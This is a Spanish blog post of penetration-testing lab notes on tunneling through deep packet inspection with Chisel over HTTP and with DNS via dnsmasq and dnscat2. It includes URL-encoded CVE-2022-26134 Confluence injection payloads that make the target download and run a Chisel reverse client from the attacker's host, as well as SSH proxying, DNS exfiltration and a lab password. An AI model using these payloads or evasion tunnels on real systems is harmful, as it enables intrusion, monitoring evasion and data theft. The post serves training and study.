---
layout: post
title: Deep Packet Tunneling
subtitle: Tunneling through deep packet inspection
tags: [pen]
---
*Deep packet inspection* es una tecnología que implementa un monitoreo de tráfico en base a conjunto de reglas. A menudo, esto se realiza sobre un perímetro de red en el que se puede dilucidar algún indicio de compromiso. 

Los dispositivos de inspección de paquetes están configurados para dejar pasar tráfico asociado a protocolos bloqueando o admitiendo por ejemplo tráfico SSH.

De esta forma, es buena idea aprender a tunelizar nuestros datos para que nuestras intervenciones en una auditoría pasen desapercibidos para cualquier posible medida de seguridad.

<br />

### 1. HTTP Tunneling Theory and Practice.

#### 1.1. HTTP Tunneling Fundamentals.

Vamos a introducir los conceptos del HTTP Tunneling con un escenario simple.

Comencemos nuestra exploración de los túneles HTTP presentando un escenario simple. En este caso, hemos comprometido CONFLUENCE01 y podemos ejecutar comandos a través de solicitudes HTTP. Sin embargo, una vez que intentamos pivotar, nos bloquea una configuración de red considerablemente restrictiva.

Específicamente, una la DPI de la red consiste en terminar todo el tráfico saliente excepto HTTP. Todos los puertos de entrada en CONFLUENCE01 están bloqueados excepto TCP/8090. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230615131428.png' | relative_url }}" text-align="center"/>
</div>

No podemos confiar en un reverse shell normal o un SSH port forwarding, ya que no se ajustaría al formato HTTP y la DPI terminaría con la coneción en el perímetro de la red. El único tráfico que llegará a nuestra máquina Kali es HTTP, por lo que podríamos, por ejemplo, realizar solicitudes con *Wget* y *cURL*.

En este caso, el dispositivo FIREWALL/INSPECTOR ha sustituido al anterior firwall simple. Además, MULTISERVER03 está bloqueado en la interfaz WAN.

Tenemos credenciales para el servidor PGDATABASE01, pero necesitamos descubrir cómo SSH directamente allí a través de CONFLUENCE01. Necesitamos un túnel hacia la red interna, pero debe parecerse a una conexión HTTP saliente de CONFLUENCE01.

<br />

#### 1.2. HTTP Tunneling With Chisel. SSH SocksProxy with ncat.

En un caso como el anterior, donde el único protocolo disponible para penetrar en la red es HTTP, utilizaríamos Chisel.

Chisel es una herramienta que encapsula un stream o flujo de datos en HTTP. También emplea el protocolo SSH dentro del túnel para que los datos encapsulados se cifren.

Chisel utiliza una arquitectura cliente-servidor y tiene multitud de opciones.

La opción más común es el *reverse port forwarding*, similar al SSH remote portforwarding; el servidor está configurado en nuestra máquina local y acepta conexiones del cliente en la máquina intermediaria que desvía las conexiones hacia la máquina objetivo.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230615182055.png' | relative_url }}" text-align="center"/>
</div>

Chisel puede ejecutarse en *macOS*, *Linux* y *Windows*, y en varias arquitecturas en cada una. Las herramientas más antiguas como *HTTPTunnel* ofrecen una funcionalidad de tunelización similar, pero carecen de la flexibilidad y las capacidades multiplataforma de Chisel.

Así, el servidor Chisel encapsulará todo lo que enviemos a través del puerto SOCKS y lo empujará a través del túnel HTTP, encriptado con SSH. El cliente de Chisel luego lo desencapsulará y lo empujará donde sea que se dirija tal y como monstramos en la imagen anterior.

Ahora pasemos a la práctica.

- Lo primero consiste en enviar nuestro cliente Chisel a la máquina intermediara, en este caso CONFLUENCE01.

	```
	kali@kali:~$ sudo systemctl start apache2
	[sudo] password for kali:
	
	kali@kali:~$ sudo cp $(which chisel) /var/www/html/
	```

	Observemos que a modo de RCE deberíamos ser capaces de ejecutar el siguiente comando en la máquina CONFLUENCE01 

	```
	wget <LOCALIP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
	```

	pero dado que la DPI es muy restrictiva no tenemos acceso directo a una shell. Así, lo que hacemos es usar el proof concept del exploit para ejecutar dicho comando:

	```
	kali@kali:~$ curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.221/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
	```

	Podemos confirmar que la request se ha relizado correctemente comprobando los logs en nuestro servidor Apache:

	```
	kali@kali:~$ tail -f /var/log/apache2/access.log
	...
	192.168.50.63 - - [21/Aug/2022:17:41:49 -0400] "GET /chisel HTTP/1.1" 200 8750339 "-" "Wget/1.20.3 (linux-gnu)"
	```

<br />

- A continuación, el siguiente paso es ejecutar los comandos correspondientes en cada una de las máquinas. En primer lugar en nuestra máquina loca, Kali, debemos iniciar el servidor Chisel:

	```
	kali@kali:~$ chisel server --port 8080 --reverse
	2022/07/22 16:43:23 server: Reverse tunnelling enabled
	2022/07/22 16:43:23 server: Fingerprint mSEANZuBWndrvnJqRgBasGtCQqbe0TkKAnPoQJgNy7Q=
	2022/07/22 16:43:23 server: Listening on http://0.0.0.0:8080
	```

	El comando anterior ejecuta el servidor para escuchar sobre el puerto 8080 y con la opción '--reverse' para realizar un *HTTP dynamic remote port forwarding*.

	Ahora, ejecutamos el siguiente comando en la máquina intermediaria:

	```
	/tmp/chisel client <LOCALIP>:8080 R:socks > /dev/null 2>&1 &
	```

	Dado que no tenemos acceso RCE directo lo volvemos a lanzar con el POF del exploit que tenemos:

	```
	kali@kali:~$ curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.221:8080%20R:socks%27%29.start%28%29%22%29%7D/
	```

	Si previamente hubiéramos filtrado el tráfico de red en la interfaz de la VPN y en el puerto 8080 seríamos capaces de ver la request que el cliente realiza al servidor Chisel:

	```
	kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
	tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
	...
	18:13:53.687533 IP (tos 0x0, ttl 63, id 53760, offset 0, flags [DF], proto TCP (6), length 276)
	    192.168.50.63.41424 > 192.168.118.4.8080: Flags [P.], cksum 0xce2b (correct), seq 1:225, ack 1, win 502, options [nop,nop,TS val 1290578437 ecr 143035602], length 224: HTTP, length: 224
	        GET / HTTP/1.1
	        Host: 192.168.118.4:8080
	        User-Agent: Go-http-client/1.1
	        Connection: Upgrade
	        Sec-WebSocket-Key: L8FCtL3MW18gHd/ccRWOPQ==
	        Sec-WebSocket-Protocol: chisel-v3
	        Sec-WebSocket-Version: 13
	        Upgrade: websocke
	
	        0x0000:  4500 0114 d200 4000 3f06 3f4f c0a8 323f  E.....@.?.?O..2?
	        0x0010:  c0a8 7604 a1d0 1f90 61a9 fe5d 2446 312e  ..v.....a..]$F1.
	        0x0020:  8018 01f6 ce2b 0000 0101 080a 4cec aa05  .....+......L...
	        0x0030:  0886 8cd2 4745 5420 2f20 4854 5450 2f31  ....GET./.HTTP/1
	        0x0040:  2e31 0d0a 486f 7374 3a20 3139 322e 3136  .1..Host:.192.16
	        0x0050:  382e 3131 382e 343a 3830 3830 0d0a 5573  8.118.4:8080..Us
	        0x0060:  6572 2d41 6765 6e74 3a20 476f 2d68 7474  er-Agent:.Go-htt
	        0x0070:  702d 636c 6965 6e74 2f31 2e31 0d0a 436f  p-client/1.1..Co
	        0x0080:  6e6e 6563 7469 6f6e 3a20 5570 6772 6164  nnection:.Upgrad
	        0x0090:  650d 0a53 6563 2d57 6562 536f 636b 6574  e..Sec-WebSocke
	        0x00a0:  2d4b 6579 3a20 4c38 4643 744c 334d 5731  -Key:.L8FCtL3MW1
	        0x00b0:  3867 4864 2f63 6352 574f 5051 3d3d 0d0a  8gHd/ccRWOPQ==..
	        0x00c0:  5365 632d 5765 6253 6f63 6b65 742d 5072  Sec-WebSocket-Pr
	        0x00d0:  6f74 6f63 6f6c 3a20 6368 6973 656c 2d76  otocol:.chisel-v
	        0x00e0:  330d 0a53 6563 2d57 6562 536f 636b 6574  3..Sec-WebSocke
	        0x00f0:  2d56 6572 7369 6f6e 3a20 3133 0d0a 5570  -Version:.13..Up
	        0x0100:  6772 6164 653a 2077 6562 736f 636b 6574  grade:.websocke
	        0x0110:  0d0a 0d0a                                ....
	18:13:53.687745 IP (tos 0x0, ttl 64, id 60604, offset 0, flags [DF], proto TCP (6), length 52)
	    192.168.118.4.8080 > 192.168.50.63.41424: Flags [.], cksum 0x46ca (correct), seq 1, ack 225, win 508, options [nop,nop,TS ...
	...
	```

	A su vez, el servidor de Chisel informa de que ha recibido una conexión.

	```
	kali@kali:~$ chisel server --port 8080 --reverse
	2022/08/21 17:57:53 server: Reverse tunnelling enabled
	2022/08/21 17:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
	2022/08/21 17:57:53 server: Listening on http://0.0.0.0:8080
	2022/08/21 18:13:54 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
	```

	Observamos que el servidor se nos informa de que se ha abierto un SocksProxy en 1080 que atiende únicamente peticiones internas. Esto se puede corroborar con ss -punta

	```
	kali@kali:~$ ss -punta
	Netid     State      Recv-Q     Send-Q           Local Address:Port            Peer Address:Port     Process
	udp       UNCONN     0          0                      0.0.0.0:34877                0.0.0.0:*
	tcp       LISTEN     0          4096                 127.0.0.1:1080                 0.0.0.0:*         users:(("chisel",pid=501221,fd=8))
	tcp       LISTEN     0          4096                         *:8080                       *:*         users:(("chisel",pid=5012:wq21,fd=6))
	tcp       LISTEN     0          511                          *:80                         *:*
	```

	Ahora, vamos a emplear ssh para conectarnos a través del SocksProxy creado por Chisel a la máquina PGDATABASE01 que está situado más allá de nuestro alcance convencional en el interior de la red corporativa que estamos asaltando. Para ello debemos tener instalado *ncat* y emplearlo con la opcion de ProxyCommand de SSH:

	```
	kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
	The authenticity of host '10.4.50.215 (<no hostip for proxy command>)' can't be established.
	ED25519 key fingerprint is SHA256:IGz427yqW3ALf9CKYWNmVctA/Z/emwMWWRG5qQP8JvQ.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.4.50.215' (ED25519) to the list of known hosts.
	database_admin@10.4.50.215's password:
	Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	
	0 updates can be applied immediately.
	
	Last login: Thu Jul 21 14:04:11 2022 from 192.168.97.19
	```

<br />

Entonces y a modo de recapitulación ante una solución DPI (Deep Inspection Packet) que sólo admite tráfico HTTP hemos utilizado una herramienta que crea un HTTP Dynamic Remote Port Forwarding y a través de ella hemos conectado a ssh a una máquina de la red interna que incialmente estaba fuera de nuestro alcance.



<br />

**1. Start VM Group 1. Follow the steps in this section, and set up Chisel as a reverse SOCKS proxy. SSH into PGDATABASE01 and retrieve the flag from /tmp/chisel_flag.**

Vamos a repetir los pasos trazados anteriormente. En este caso, utilizamos chisel para obtener RCE (ejecución remota de código) debido a que existe un firewall que sólo admite tráfico HTTP.

De esta forma, utilizamos la vulnerabilidad vista anteriormente para subir primero el binario de chisel y luego ejecutarlo en modo cliente.

Primero preparamos el binario para ser recogido a través de tráfico HTTP con wget:

```
┌──(kali㉿kali)-[~/Documents/OSCP]
└─$ cp $(which chisel) .                      

┌──(kali㉿kali)-[~/Documents/OSCP]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Seguidamente, utilizamos el exploit mencioando anteriormente para introducir el binario y darle permisos de ejecución:

```
wget 192.168.45.244/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

Lo codificamos en URL y lo adherimos al exploit.

```bash
curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.221/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

Y seguidamente, ejecutamos el servidor de chisel en nuestra máquina para crear un reverse shell:

```
┌──(kali㉿kali)-[~]
└─$ chisel server --port 8080 --reverse
2023/07/10 15:04:28 server: Reverse tunnelling enabled
2023/07/10 15:04:28 server: Fingerprint +9exPibrJUkLBEywFxMQl7J8MH7BcOFegwu4rOosecU=
2023/07/10 15:04:28 server: Listening on http://0.0.0.0:8080
```

Y ahora ejecutamos el cliente en la máquina comprometida:

```
/tmp/chisel client 192.168.45.244:8080 R:socks > /dev/null 2>&1 &
```

<br />

```
curl http://192.168.219.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.244:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

Esto hará que el cliente realize una request a nuestro servidor chisel creando un túnel http (HTTP WebSocket) sobre el que transportar datos. Todo lo que resta es utilizar una herramienta diseñada para interactuar con un WebSocket como *ncat*:

```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.223.215
```

**2. Start VM Group 2. Download /exercises/chisel_exercise_client from CONFLUENCE01. There's a server running on port 8008 on PGDATABASE01. Set up a port forward using Chisel that allows you to run chisel_exercise_client against port 8008 on PGDATABASE01.**

Procedemos como en el caso anterior y establecemos un túnel HTTP con Chisel (un binario descargado desde github) y de ahí utilizamos proxy chains modificando previamente el fichero de configuración para seguir el túnel HTTP:

```
tail /etc/proxychains4.conf 
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

<br />

```
┌──(kali㉿kali)-[~/Documents/OSCP]
└─$ proxychains ./chisel_exercise_client -i 10.4.223.215 -p 8008
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Connecting to 10.4.223.215:8008
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.4.223.215:8008  ...  OK
Flag: "OS{e3fcdb70c95cfdb9ab03a5d0174850dc}"
```


<br />

### 2. DNS Tunneling Theory and Practice.

El DNS es uno de los protocolos fundamentales de Internet y ha sido objeto de abuso por parte de los atacantes con diversos fines nefastos. Por ejemplo, puede servir como un mecanismo para canalizar datos indirectamente dentro y fuera de entornos de red restrictivos. Para comprender exactamente cómo funciona esto, presentemos un "curso acelerado" simplificado en DNS. Luego aprenderemos a realizar túneles DNS con una herramienta llamada dnscat2.

<br />

#### 2.1. DNS Tunneling Fundamentals.

**DNS Fundamentals**

Como bien sabemos, el protocolo DNS (Domain Name System) es protocolo de resolución de dominios que relaciona un dominio (un nombre asociado a un host que a su vez es más legible por un humano) con una dirección IP con la que una máquina puede trabajar y enrutar datos hacia una localización precisa.

Concretamente, este intercambio de información de IP - Domain y viceversa se consigue consultando a servidores DNS. 

Concretamente, en la mayoría de los casos, realizaremos consultas sobre un *DNS recursive resolver* para pedir un *DNS A record* (este registro contiene direcciones IPv4). Para satisfacer nuestra request, el servidor DNS realiza una serie de DNS queries hasta recopilar nuestros datos.

En primer lugar, el DNS recursive resolver posee una lista de *root name servers*, manda una DNS query a uno de estos root servers. El root server contestará con el TLD name server. (El TLD es un acrónimo de Top-Level Domain que consiste en la extensión del dominio, .com, .net, .es, etc) 

De esta forma el DNS recursive resolver envía una petición al TDL name server preguntándole qué DNS server es el responsable del dominio en cuestión. El TDL name server responderá con el *authoritative name server* del dominio que a su vez, al ser consultado, devuelve el A record del dominio que a su vez es transferido a nosotros. 

Todas estas peticiones se realizan a través del protocolo UDP en concreto, el puerto asociado al servicio DNS es el 53/udp.

<br />

**DNS Tunneling exfiltration. Manual case.**

Supongámos ahora nuestro entorno de laboratorio habitual. En él el MULTISERVER03 actúa como servidor DNS. Una request de una máquina de la red interna como por ejemplo PGDATABASE01 quedaría como sigue:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230617122654.png' | relative_url }}" text-align="center"/>
</div>

En este caso el firewall se ha eliminado de la imagen por una cuestión de simplicidad.

Ahora supongámos que existe un host FELINEAUTHORITY situado en la WAN, alcanzable por la MULTISERVER03, CONFLUENCE01 y nuestra Kali, sin embargo las máquinas del interior de la red PGDATABASE01 o HRSHARES no pueden.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230617124535.png' | relative_url }}" text-align="center"/>
</div>

Para ver cómo se transmitirán las solicitudes de DNS a FELINEAUTHORITY desde PGDATABASE01, debemos iniciar las solicitudes de DNS desde PGDATABASE01 y monitorear lo que llega a FELINEAUTHORITY. Por esa razón, necesitamos una shell en cada una de estas máquinas.

Como en los ejemplos anteriores, solo podemos acceder a PGDATABASE01 a través de CONFLUENCE01. Entonces, para conectarnos al servidor SSH en PGDATABASE01, debemos pasar por CONFLUENCE01. Pondremos en peligro CONFLUENCE01 explotando CVE-2022-26134 con nuestra carga útil de shell inverso y crearemos un reenvío de puerto remoto SSH para transmitir un puerto en nuestra máquina Kali al servicio SSH en PGDATABASE01. Luego usaremos SSH en PGDATABASE01 como el usuario _database_admin_ .

Dado que FELINEAUTHORITY también está en la WAN, podemos ingresar directamente a FELINEAUTHORITY mediante SSH usando el nombre de usuario _kali_ y la contraseña _7he_C4t_c0ntro11er_ .

Ahora tenemos dos shells abiertas. El primero está en PGDATABASE01 como usuario *database_admin* y el segundo está en FELINEAUTHORITY como usuario *kali*.

Vamos a setear FELINEAUTHORITY como un DNS server, concretamente, como un authoritative name server para el dominio *feline.corp*, usando *Dnsmasq* (Un software DNS server que requiere una configuración mínima. 

 Algunos archivos de configuración de Dnsmasq se almacenan en la carpeta **~/dns_tunneling** , que usaremos como parte de nuestros experimentos de DNS. Para este experimento inicial, usaremos el archivo de configuración muy escaso **dnsmasq.conf** .

```
kali@felineauthority:~$ cd dns_tunneling

kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```


Esta configuración ignora los archivos **/etc/resolv.conf** y **/etc/hosts** y solo define las variables _auth-zone_ y _auth-server ._ Estos le dicen a Dnsmasq que actúe como el authorized name server para la zona **feline.corp**. No hemos configurado ningún registro hasta el momento. Las solicitudes de cualquier cosa en el dominio feline.corp devolverán respuestas de falla.

Ahora iniciamos el proceso **dnsmasq**:

```
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
```

La flag -C le dicata al programa que utilice un determinado fichero de configuración y el -d le dicta que no inicie como un 'daemon' para que se ejecute en primer plano.

En una segunda shell abrimos un *tcpdump* 

```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Ahora que tenemos un DNS server listo y que además estámos esnifando las queries que llegan entre ambos procedemos a nuestra shell en PGDATABASE01.

Vamos a revisar la configuración DNS del host con *resolvectl status*:

```
database_admin@pgdatabase01:~$ resolvectl status
...             

Link 5 (ens224)
      Current Scopes: DNS        
DefaultRoute setting: yes        
       LLMNR setting: yes        
MulticastDNS setting: no         
  DNSOverTLS setting: no         
      DNSSEC setting: no         
    DNSSEC supported: no         
  Current DNS Server: 10.4.50.64
         DNS Servers: 10.4.50.64

Link 4 (ens192)
      Current Scopes: DNS        
DefaultRoute setting: yes        
       LLMNR setting: yes        
MulticastDNS setting: no         
  DNSOverTLS setting: no         
      DNSSEC setting: no         
    DNSSEC supported: no         
  Current DNS Server: 10.4.50.64
         DNS Servers: 10.4.50.64
```

Podemos observar que la dirección IP asociada al servidor DNS coincide con la MULTISERVER03. Consultará MULTISERVER03 cada vez que necesite resolver un nombre de dominio. 

A modo de prueba, realizamos un *nslookup* por *exfiltrated-data.feline.com*. 

```
database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
Server:		127.0.0.53
Address:	127.0.0.53#53

** server can't find exfiltrated-data.feline.corp: NXDOMAIN
```

En el tcpdump de FELINEAUTHORITY obtenemos la query:

```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)
04:57:40.721786 IP 192.168.118.4.domain > 192.168.50.64.65122: 26234 NXDomain 0/0/1 (57)
```

Podemos ver que hemos recibido una conexión por parte de la IP de MULTISERVER03 que consiste en una DNS query en busca de exfiltrated-data.feline.corp. Esto ocurre porque MULTISERVER03 actúa como el DNS server de la red e identifica a FELINEAUTHORITY como el authority name server para la zona feline.corp.

Todas las solicitudes de _cualquier_ subdominio de **feline.corp** se reenviarán a FELINEAUTHORITY. No le dijimos a Dnsmasq en FELINEAUTHORITY qué hacer con las solicitudes de **exfiltrated-data.feline.corp** , por lo que Dnsmasq solo devolvió una respuesta _NXDomain_:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230617192217.png' | relative_url }}" text-align="center"/>
</div>

El diagrama no muestra los pasos en los que la MULTISERVER03 realiza queries sobre el root server y el TLD server por simplicidad.

El quid de la cuestión es que una query DNS arbitraria ha salido de la red y ha recaído sobre una máquina que controlamos. Esto significa que podemos exfiltrar pequeñas cantidades de información de la red a través del protocolo DNS.

Este método puede valernos para por ejemplo extraer el resultado del algún comando sin embargo para extraer cantidades de información más grandes como un binario utilizaríamos otro procedimiento.

Concretamente utilizaríamos una sequencia de queries en serie.

En primer lugar, convertiríamos el binario en una larga cadena hexadecimal, seguidamente partimos esta cadena en pequeños trozos y mandamos cada uno de estos trozos a través de las requests de DNS.

<br />

**DNS Tunneling infiltration**

Ahora que hemos visto como exfiltrar datos, veámos como infiltrar datos en la red.

En las DNS requests siempre solicitamos A records que recordemos, contienen IPv4s. Sin embargo existen otros tipos de records, como por ejemplo TXT records los cuales contienen "arbitrary string information".

Podemos configurar FELINEAUTHORITY para servir registros TXT. En primer lugar volvemos a la shell que contenía el servicio DNS ejecutándose en primer plano y matamos el proceso empleando Ctrl+C. Seguidamente, revisamos los contenidos de dnsmasq_txt.conf.

```
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.

kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
```

Se puede ver que hemos añadido dos líneas con contenido refiriendo dos txt records y seguidamente hemos reiniciado el servicio con la configuración del fichero especificado y en primer plano.

De esta forma, cualquier DNS request para el dominio 'www.feline.corp' tendrá como vuelta las dos líneas anteriores:

```
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:		192.168.50.64
Address:	192.168.50.64#53

Non-authoritative answer:
www.feline.corp	text = "here's something useful!"
www.feline.corp	text = "here's something else less useful."

Authoritative answers can be found from:

database_admin@pgdatabase01:~$
```

Esta es una forma de obtener datos en una red interna utilizando registros DNS. Si quisiéramos infiltrarnos en datos binarios, podríamos servirlos como una serie de registros TXT _con codificación hexadecimal_ _Base64_ o ASCII y volver a convertirlos en binarios en el servidor interno.

En esta sección, discutimos cómo podríamos infiltrarnos o filtrar datos a través de varios tipos de registros DNS. En la siguiente sección, obtendremos experiencia práctica con el marco _dnscat2_, que aprovecha estas técnicas para crear un túnel DNS multipropósito.

<br />

#### 2.2. DNS Tunneling with dnscat2.

Podemos utilizar la herramienta *Dnscat2* para exfiltrar datos con DNS queries e infiltrar datos a través de TXT records.

Dnscat2 tiene una arquitectura cliente-servidor. El servidor se ejecuta en un *authoritative name server* y responde a un dominio particular, a su vez el cliente se ejecuta en las máquinas comprometidas y está configurado para realizar queries sobre el dominio en cuestión.

Para comprobar cómo funciona el mecanismo de esta herramienta en profundidad supongámos el caso del laboratorio anterior.

En FELINEAUTHORITY seteamos un listener de tcpdump:

```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

E iniciamos en otra shell el dnscat2-server pasando como argumento el dominio 'feline.corp':

```
kali@felineauthority:~$ dnscat2-server feline.corp

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```

El output de la herramienta nos señala que hay un servidor DNS escuchando en todas las interfaces en 53/udp.

Ahora, en PGDATABASE01; la máquina comprometida en el interior de la red que no tiene conexión con la WAN, seteamos el cliente (que ha sido transferido a la máquina previamente). Ejecutamos el cliente pasándole como argumento el dominio referido en el servidor:

```
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Annoy Mona Spiced Outran Stump Visas 

Session established!
```

El cliente nos informa de que se ha establecido una conexión con éxito. Podemos volver a nuestro servidor para verificar las conexiones

```
kali@felineauthority:~$ dnscat2-server feline.corp
[sudo] password for kali: 

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=7a87a5d0a8480b080896606df6b63944 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=7a87a5d0a8480b080896606df6b63944

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas

dnscat2>
```

¡Nuestra sesión está conectada! El DNS funciona exactamente como se esperaba. Las solicitudes de PGDATABASE01 están siendo resueltas por MULTISERVER03 y terminan en FELINEAUTHORITY.

Cuando se ejecuta sin un indicador precompartido _--secret_ en cada extremo, dnscat2 imprimirá una _cadena de autenticación_ . Esto se utiliza para verificar la integridad de la conexión después de que se haya negociado el cifrado. La cadena de autenticación en este caso ("Annoy Mona Spiced Outran Stump Visas") es la misma tanto en el cliente como en el servidor, por lo que sabemos que no hay manipulación en línea. Cada vez que se realiza una conexión, la cadena de autenticación cambiará.

En nuestro *tcpdump* podemos ver todas las DNS queries y DNS responses;

```
...
07:22:14.732111 IP 192.168.50.64.51077 > 192.168.118.4.domain: 29066+ [1au] TXT? 8f150140b65c73af271ce019c1ede35d28.feline.corp. (75)
07:22:14.732538 IP 192.168.118.4.domain > 192.168.50.64.51077: 29066 1/0/0 TXT "b40d0140b6a895ada18b30ffff0866c42a" (111)
07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME? 38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX? 8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX 385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
